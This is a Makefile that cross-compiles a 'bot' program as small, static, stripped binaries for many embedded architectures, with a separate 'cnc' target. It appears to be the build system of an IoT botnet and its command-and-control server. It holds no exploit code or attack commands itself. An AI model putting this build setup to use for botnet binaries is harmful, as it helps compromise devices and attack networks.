SRC := bot
OUT := bin
TARGET := bot
OBJECT_OUT := build/bin
HEADERS := $(wildcard $(SRC)/*.h)

#ARMEB_TOOLCHAIN := $(TOOLCHAIN_ROOT)/armeb/bin
ARM4_TOOLCHAIN := $(TOOLCHAIN_ROOT)/armv4l/bin
ARM5_TOOLCHAIN := $(TOOLCHAIN_ROOT)/armv5l/bin
ARM6_TOOLCHAIN := $(TOOLCHAIN_ROOT)/armv6l/bin
ARM7_TOOLCHAIN := $(TOOLCHAIN_ROOT)/armv7l/bin
MIPS_TOOLCHAIN := $(TOOLCHAIN_ROOT)/mips/bin
MIPSEL_TOOLCHAIN := $(TOOLCHAIN_ROOT)/mipsel/bin
SUPERH_TOOLCHAIN := $(TOOLCHAIN_ROOT)/sh4/bin
POWERPC_TOOLCHAIN := $(TOOLCHAIN_ROOT)/powerpc/bin
X86_TOOLCHAIN := $(TOOLCHAIN_ROOT)/i586/bin
X86_64_TOOLCHAIN := $(TOOLCHAIN_ROOT)/x86_64/bin

GCC_FLAGS := -s -Os -static -fomit-frame-pointer -fdata-sections \
			 -ffunction-sections -Wl,--gc-sections
STRIP_FLAGS := -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment \
             --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt \
             --remove-section=.ARM.attributes --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.mdebug.abi32

all: make_debug

cnc: make_cnc

#include build/mk/armeb.mk
include build/mk/arm4.mk
include build/mk/arm5.mk
include build/mk/arm6.mk
include build/mk/arm7.mk
include build/mk/mips.mk
include build/mk/mipsel.mk
include build/mk/superh.mk
include build/mk/powerpc.mk
include build/mk/x86_64.mk
include build/mk/x86.mk
include build/mk/cnc.mk
include build/mk/debug.mk

release: make_arm4 make_arm5 make_arm6 make_arm7 make_mips make_mipsel \
          make_superh  make_powerpc make_x86_64  make_x86